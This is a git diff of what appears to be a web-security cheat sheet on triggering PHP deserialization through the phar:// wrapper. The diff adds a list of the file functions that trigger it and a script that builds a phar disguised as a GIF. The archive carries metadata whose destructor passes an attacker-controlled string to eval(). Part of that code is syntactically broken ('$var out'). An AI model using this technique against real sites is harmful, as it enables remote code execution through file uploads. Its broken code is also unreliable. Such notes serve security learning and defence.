@@ -70,14 +70,46 @@ Tools:
 ## Reference
 1. [chybeta's blog](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  
 
-## With phar
+## unserialize With phar
 Sam Thomas published a new way to trigger a unserialization without use of `unserialize()` in blackhat 2018. This can be done with `php://phar`.  
-Trace to the kernel of PHP, we can find that `meta-data` would be unserialized when library function use `phar://` to parse the phar document. Therefore, we can build up a malicious phar and deliver to file functions such as `file_get_contents()` or `file_exists()`.  
+Trace to the kernel of PHP, we can find that `meta-data` would be unserialized when library function use `phar://` to parse the phar document. Therefore, we can build up a malicious phar document and pass to file functions such as:  
+```php
+// file(phar://) -> unserialization
+file_exists, file_get_contents, file_put_contents, file, fopen, is_dir, is_executable, is_file, is_link, is_readable, is_writable, copy, unlink, stat, readfile
+```  
+Just a little test can prove the concept:  
+```php
+class Test {
+        public function __destruct() {
+            echo 'unserialization happen!';
+      }
+}
+
+file_exists($filename);
+// $filename = phar://uploaded/xxx.gif
+```  
+Then you can see **unserialization happen!**.  
+
+Therefore, there are three requirements to implement it: `magic file function`, `uploadable file`, `phar:// is allowed`.  
 1. We might not be able to upload the phar file to the website directly. However, we can add other header to forge it.  
 ```php
-$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");  // forge to gif
+// generate phar
+class Test {
+   $var out = 'hello';
+   function __destruct(){
+        eval($this -> out);
+   }
+}
 
-$phar->setMetadata($o);   // here you can control the parameter to trigger vul of unserialization
+@unlink("phar.phar");
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");     // forge to gif
+$o = new Test();
+$o -> out = 'phpinfo();';
+$phar->setMetadata($o);      // set your own definition to metada
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
 ```  
 2. Trace any function: whether it calls file open function in the bottom side, then whether we can control its parameter. What's more interesting, it even can be used to make a DOS attack.  
 
